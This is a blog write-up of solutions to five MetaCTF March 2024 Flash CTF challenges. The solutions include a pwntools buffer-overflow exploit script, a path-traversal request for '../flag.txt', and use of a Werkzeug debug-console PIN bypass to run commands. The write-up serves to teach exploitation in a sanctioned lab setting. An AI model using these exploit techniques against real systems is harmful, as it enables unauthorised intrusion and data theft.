<!doctype html><html data-theme=dark lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#9a9996 name=theme-color><meta content=#20c20e media=(prefers-color-scheme:dark) name=theme-color><title>Ô∏èüè¥ MetaCTF March 2024 Flash CTF - psypherpunk::blog</title><link href=https://blog.psypherpunk.io/blog/metactf-march-2024-flash-ctf/ rel=canonical><link href=https://blog.psypherpunk.io/favicon.png rel=icon type=image/png><link href=https://blog.psypherpunk.io/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><link title="psypherpunk::blog - RSS Feed" href=https://blog.psypherpunk.io/rss.xml rel=alternate type=application/rss+xml><link title="psypherpunk::blog - Atom Feed" href=https://blog.psypherpunk.io/atom.xml rel=alternate type=application/atom+xml><style>:root{--accent-color:#6f8396}[data-theme=dark]{--accent-color:#20c20e}@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--accent-color:#20c20e}}</style><link href=https://blog.psypherpunk.io/style.css rel=stylesheet><script defer src=https://blog.psypherpunk.io/closable.js></script><meta content=psypherpunk::blog property=og:site_name><meta content="Ô∏èüè¥ MetaCTF March 2024 Flash CTF - psypherpunk::blog" property=og:title><meta content=https://blog.psypherpunk.io/blog/metactf-march-2024-flash-ctf/ property=og:url><meta content="A monthly mini CTF competition organized by MetaCTF and Antisyphon." property=og:description><meta content=https://blog.psypherpunk.io/card.png property=og:image><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main-content tabindex=0> Skip to Main Content </a><ul><li id=home><a href=https://blog.psypherpunk.io> <i class=icon></i>psypherpunk::blog</a><li class=divider><li><a href=https://blog.psypherpunk.io/blog/>Blog</a><li id=feed><details class=closable><summary class=circle title=Feed><i class=icon></i></summary> <ul><li><a href=https://blog.psypherpunk.io/rss.xml>RSS</a><li><a href=https://blog.psypherpunk.io/atom.xml>Atom</a></ul></details></ul></nav></header><main id=main-content><article><div id=heading><p><small> <time datetime=" 2024-03-22T00:00:00+00:00">Published on March 22, 2024</time></small><h1>Ô∏èüè¥ MetaCTF March 2024 Flash CTF</h1><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/categories/ctf/>ctf</a></ul><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/tags/ctf/>ctf</a></ul></div><div id=buttons-container><a title="Go to Top" href=#top id=go-to-top><i class=icon></i></a></div><h2 id=metactf-march-2024-flash-ctf>MetaCTF March 2024 Flash CTF</h2><blockquote><p><em>A monthly mini CTF competition organized by MetaCTF with support from Antisyphon Training and TCM Security.</em></blockquote><span id=continue-reading></span><h3 id=camping-adventures>Camping Adventures</h3><blockquote><p><em>My friend went camping near some beautiful lake the other day and sent me a photo, but they refuse to tell me where it was!</em><p><img alt=lake.jpg src=https://metaproblems.com/f95246689bf80875673db4b3570be2ba/lake.jpg><p><em>Can you help me figure out the name of that lake?</em><p><em>Simply enter the name of the lake as the flag. It does not need to be in the MetaCTF{} format.</em></blockquote><p>Taking a quick look at the JPEG‚Äôs metadata:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>‚ùØ</span><span> exiftool lake.jpg | </span><span style=color:#bf616a>rg</span><span> GPS
</span><span style=color:#bf616a>GPS</span><span> Latitude Ref                : North
</span><span style=color:#bf616a>GPS</span><span> Longitude Ref               : West
</span><span style=color:#bf616a>GPS</span><span> Latitude                    : 39 deg 9'</span><span style=color:#a3be8c> 7.99" N
</span><span style=color:#a3be8c>GPS Longitude                   : 106 deg 24</span><span>' 20.73"</span><span style=color:#a3be8c> W
</span><span style=color:#a3be8c>GPS Position
</span></code></pre><p>Converting that to the format more readily accepted by Google Maps‚Äî<code>39¬∞09'07.99"N 106¬∞24'20.73"W</code>‚Äîshows that this is ‚ÄúEmerald Lake‚Äù (somewhere in Colorado), which is the flag.<h3 id=26-dimensions>26 Dimensions</h3><blockquote><p><em>The supercomputing center just put out <a href=https://metaproblems.com/e59fa86469ee27e097765a8dd60c6b61/physics-checker>a program</a> that checks physics theories for correctness. Can you figure out the answer to the universe and everything?</em><p><em>Perhaps it‚Äôs not as smart as they claim it is, and it has the answer hardcoded?</em></blockquote><p>This one is hiding in plain sight:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>‚ùØ</span><span> strings physics-checker | </span><span style=color:#bf616a>rg</span><span> Meta
</span><span style=color:#bf616a>MetaCTF{wow_ther3s_lik3_littl3_str1ng5_1n_stuff</span><span>}
</span></code></pre><h3 id=xylophone-network-graphics>Xylophone Network Graphics</h3><blockquote><p><em>I generated <a href=https://metaproblems.com/a200e0724f29c00c9700dcbc4c38f363/encrypted.xpng>some art</a> as a PNG image, and then encrypted the file using an 8-character-long key that was repeated.</em><p><em>I can‚Äôt remember what it was! Can you help me decrypt the image and retrieve the flag?</em></blockquote><p>According to the <a href=http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html><em>PNG (Portable Network Graphics) Specification, Version 1.2</em></a>:<blockquote><p><em>The first eight bytes of a PNG file always contain the following (decimal) values:</em><p><code>137 80 78 71 13 10 26 10</code></blockquote><p>With an 8-character key and an 8-byte header, this is effectively a known-plaintext attack:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>with </span><span style=color:#96b5b4>open</span><span>("</span><span style=color:#a3be8c>encrypted.xpng</span><span>", "</span><span style=color:#a3be8c>rb</span><span>") </span><span style=color:#b48ead>as </span><span>i:
</span><span>    encrypted = i.</span><span style=color:#bf616a>read</span><span>()
</span><span>
</span><span>header = (</span><span style=color:#bf616a>int</span><span>(b) </span><span style=color:#b48ead>for </span><span>b </span><span style=color:#b48ead>in </span><span>"</span><span style=color:#a3be8c>137 80 78 71 13 10 26 10</span><span>".</span><span style=color:#bf616a>split</span><span>())
</span><span>key = [a ^ b </span><span style=color:#b48ead>for </span><span>a, b </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>zip</span><span>(encrypted[:</span><span style=color:#d08770>8</span><span>], header)]
</span><span>
</span><span>chunks = (encrypted[i:i+</span><span style=color:#d08770>8</span><span>] </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>0</span><span>, </span><span style=color:#96b5b4>len</span><span>(encrypted), </span><span style=color:#d08770>8</span><span>))
</span><span>
</span><span>decrypted = (
</span><span>    key[i] ^ c
</span><span>    </span><span style=color:#b48ead>for </span><span>chunk </span><span style=color:#b48ead>in </span><span>chunks
</span><span>    </span><span style=color:#b48ead>for </span><span>i, c </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>enumerate</span><span>(chunk)
</span><span>)
</span><span>
</span><span style=color:#b48ead>with </span><span style=color:#96b5b4>open</span><span>("</span><span style=color:#a3be8c>decrypted.png</span><span>", "</span><span style=color:#a3be8c>wb</span><span>") </span><span style=color:#b48ead>as </span><span>o:
</span><span>    o.</span><span style=color:#bf616a>write</span><span>(</span><span style=color:#bf616a>bytes</span><span>(decrypted))
</span></code></pre><p>That decrypted PNG is:<p><img alt=decrypted.png src=/img/metactf-march-2024-flash-ctf-decrypted.png><p>‚Ä¶which, beneath the glorious WordArt, reads:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>MetaCTF{kn0wn_pl4int3xt_d3cryption}
</span></code></pre><h3 id=how-cool-are-you>How Cool Are You?</h3><blockquote><p><em>Are you cool enough to get in? Connect via <code>nc kubenode.mctf.io 30005</code> and find out.</em><p><em>You can grab the <a href=/img/metactf-march-2024-flash-ctf-decrypted.jpg>binary here</a>, and the <a href=https://metaproblems.com/3a684429dd66e9c497112cca3f69f676/chal.c>source here</a>. Good luck.</em></blockquote><p>The challenge itself greets me with something I‚Äôve always known:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>‚îÄ‚îÄ</span><span>(root„âøpsy-xps-13)</span><span style=color:#bf616a>-[/mnt]
</span><span style=color:#bf616a>‚îî‚îÄ#</span><span> ./chal
</span><span style=color:#bf616a>Whoa</span><span> there, my dude. Only the truly cool are allowed in here.
</span><span style=color:#bf616a>What</span><span>'</span><span style=color:#a3be8c>s your name? PsypherPunk
</span><span style=color:#a3be8c>PsypherPunk, it looks like your coolness value is 6990.
</span><span style=color:#a3be8c>I</span><span>'</span><span style=color:#bf616a>m</span><span> sorry, you'</span><span style=color:#a3be8c>re just not cool enough. Get lost!
</span></code></pre><p>Harsh but fair.<p>The input name is stored in a <code>char[64]</code> which is read via an unsafe <code>gets()</code>, which is ripe for a buffer-overflow. Specifically, <code>your_name</code> needs to overflow that boundary, then write <em>exactly</em> 1,500,000,001 into the next variable <code>your_estimated_coolness</code>.<p>Expressed as little-endian bytes, that‚Äôs:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> int.</span><span style=color:#bf616a>to_bytes</span><span>(</span><span style=color:#d08770>1500000001</span><span>, </span><span style=color:#d08770>4</span><span>)[::-</span><span style=color:#d08770>1</span><span>]
</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#96b5b4>\x01</span><span style=color:#a3be8c>/hY</span><span>'
</span></code></pre><p>However, it‚Äôs not just 64 bytes plus that: <code>your_name</code> is not necessarily adjacent to <code>your_estimated_coolness</code>. So iterating locally using <code>pwntools.process</code>, it‚Äôs actually <em>76</em> bytes needed to overflow:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>from </span><span>pwn </span><span style=color:#b48ead>import </span><span>process, remote
</span><span>
</span><span>
</span><span>p = </span><span style=color:#bf616a>remote</span><span>("</span><span style=color:#a3be8c>kubenode.mctf.io</span><span>", </span><span style=color:#d08770>30005</span><span>)
</span><span>
</span><span style=color:#bf616a>_ </span><span>= p.</span><span style=color:#bf616a>readuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>What's your name? </span><span>")
</span><span>
</span><span>name = </span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>A</span><span>" * </span><span style=color:#d08770>76 </span><span>+ int.</span><span style=color:#bf616a>to_bytes</span><span>(</span><span style=color:#d08770>1500000001</span><span>, </span><span style=color:#d08770>4</span><span>)[::-</span><span style=color:#d08770>1</span><span>]
</span><span>
</span><span>p.</span><span style=color:#bf616a>sendline</span><span>(name)
</span><span>
</span><span style=color:#bf616a>_ </span><span>= p.</span><span style=color:#bf616a>readuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Oh, right</span><span>")
</span><span style=color:#96b5b4>print</span><span>(p.</span><span style=color:#bf616a>readline</span><span>().</span><span style=color:#bf616a>decode</span><span>().</span><span style=color:#bf616a>split</span><span>()[-</span><span style=color:#d08770>1</span><span>])
</span><span>
</span><span>p.</span><span style=color:#bf616a>close</span><span>()
</span></code></pre><p>That results in:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>‚îå‚îÄ‚îÄ</span><span>(root„âøpsy-xps-13)</span><span style=color:#bf616a>-[/mnt]
</span><span style=color:#bf616a>‚îî‚îÄ#</span><span> ./how-cool-are-you.py
</span><span style=color:#bf616a>[+]</span><span> Opening connection to kubenode.mctf.io on port 30005: Done
</span><span style=color:#bf616a>MetaCTF{oh_w0w_y0ur3_pr3tty_c00l_aft3r_a11</span><span>}
</span><span style=color:#bf616a>[*]</span><span> Closed connection to kubenode.mctf.io port 30005
</span></code></pre><h3 id=flaskform-pharmaceuticals>FlaskForm Pharmaceuticals</h3><blockquote><p><em>We at FlaskForm Pharmaceuticals have been developing potions for ages, but we just developed our new website! Come check it out! Spawn an instance below to get started.</em><p><em>You can download the source code <a href=https://metaproblems.com/c56ba06dde50b26c64cce8894d4305c6/FlaskForm_Pharma.zip>here</a>.</em></blockquote><p>When running this locally, the flag can be read locally via a simple LFI; remotely, however:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>‚ùØ</span><span> curl http://dphltvzl.chals.mctf.io/products/detail \
</span><span>‚àô</span><span style=color:#bf616a>     --request</span><span> POST \
</span><span>‚àô</span><span style=color:#bf616a>     --header </span><span>'</span><span style=color:#a3be8c>Content-Type: application/json</span><span>' \
</span><span>‚àô</span><span style=color:#bf616a>     --data-raw </span><span>'</span><span style=color:#a3be8c>{"file":"../flag.txt"}</span><span>'
</span><span style=color:#bf616a>{</span><span>"</span><span style=color:#a3be8c>content</span><span>"</span><span style=color:#bf616a>:</span><span>"</span><span style=color:#a3be8c>[Errno 13] Permission denied: './potion_details/../flag.txt'</span><span>"}
</span></code></pre><p>The error is due to the <code>Dockerfile</code> setup:<pre class=language-docker data-lang=docker style=color:#c0c5ce;background-color:#2b303b><code class=language-docker data-lang=docker><span>RUN chmod 555 /app/readflag
</span><span>RUN chmod 400 /app/flag.txt
</span><span>RUN chown root:root /app/flag.txt
</span><span>RUN chmod u+s /app/readflag
</span></code></pre><p>The Flask instance, however, is running in debug mode:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>start_server</span><span>():
</span><span>    </span><span style=color:#bf616a>run_simple</span><span>('</span><span style=color:#a3be8c>0.0.0.0</span><span>', </span><span style=color:#d08770>8000</span><span>, app, </span><span style=color:#bf616a>use_reloader</span><span>=</span><span style=color:#d08770>True</span><span>, </span><span style=color:#bf616a>use_debugger</span><span>=</span><span style=color:#d08770>True</span><span>, </span><span style=color:#bf616a>use_evalex</span><span>=</span><span style=color:#d08770>True</span><span>)
</span></code></pre><p>‚Ä¶so the console is available at <code>/console</code> but is protected by a generated PIN. Similar to the HackTheBox challenge <a href=https://app.hackthebox.com/challenges/DeSynth%2520Recruit><em>Desynth Recruit</em></a> (which I coincidentally solved not too long ago), it‚Äôs possible to use <a href=https://github.com/wdahlenburg/werkzeug-debug-console-bypass><code>wdahlenburg/werkzeug-debug-console-bypass</code></a> in combination with the LFI to leak the associated details and to determine the PIN.<p>Once the PIN‚Äôs generated, the console allows the <code>readflag</code> binary to be read:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span>>>> import </span><span style=color:#bf616a>os
</span><span>>>> print(</span><span style=color:#bf616a>os.popen</span><span>("</span><span style=color:#a3be8c>/app/readflag</span><span>").read())
</span><span style=color:#bf616a>MetaCTF{m4g1c4l_fl4sks_sh3lv3d_4nd_f1led</span><span>}
</span></code></pre></article><hr><nav id=post-nav><a class="post-nav-item post-nav-prev" href=https://blog.psypherpunk.io/blog/metactf-february-2024-flash-ctf/> <div class=nav-arrow>Previous</div> <span class=post-title>Ô∏èüè¥ MetaCTF February 2024 Flash CTF</span> </a><a class="post-nav-item post-nav-next" href=https://blog.psypherpunk.io/blog/metactf-april-2024-flash-ctf/> <div class=nav-arrow>Next</div> <span class=post-title>Ô∏èüè¥ MetaCTF April 2024 Flash CTF</span> </a></nav></main><footer id=site-footer><nav><ul><li><a href=https://blog.psypherpunk.io/blog/>Blog</a></ul></nav><p>¬© 2025 PsypherPunk<ul id=socials><li><a rel=" me" href=https://github.com/PsypherPunk title=GitHub> <i style="--icon:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EGitHub%3C/title%3E%3Cpath d='M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12'/%3E%3C/svg%3E&#34)" class=icon></i> <span>GitHub</span> </a><li><a rel=" me" href=https://hachyderm.io/@psypherpunk title=Mastodon> <i style="--icon:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EMastodon%3C/title%3E%3Cpath d='M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z'/%3E%3C/svg%3E&#34)" class=icon></i> <span>Mastodon</span> </a><li><a rel=" me" href=https://twitter.com/PsypherPunk title=Twitter> <i style="--icon:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ETwitter%3C/title%3E%3Cpath d='M21.543 7.104c.015.211.015.423.015.636 0 6.507-4.954 14.01-14.01 14.01v-.003A13.94 13.94 0 0 1 0 19.539a9.88 9.88 0 0 0 7.287-2.041 4.93 4.93 0 0 1-4.6-3.42 4.916 4.916 0 0 0 2.223-.084A4.926 4.926 0 0 1 .96 9.167v-.062a4.887 4.887 0 0 0 2.235.616A4.928 4.928 0 0 1 1.67 3.148 13.98 13.98 0 0 0 11.82 8.292a4.929 4.929 0 0 1 8.39-4.49 9.868 9.868 0 0 0 3.128-1.196 4.941 4.941 0 0 1-2.165 2.724A9.828 9.828 0 0 0 24 4.555a10.019 10.019 0 0 1-2.457 2.549z'/%3E%3C/svg%3E&#34)" class=icon></i> <span>Twitter</span> </a></ul></footer>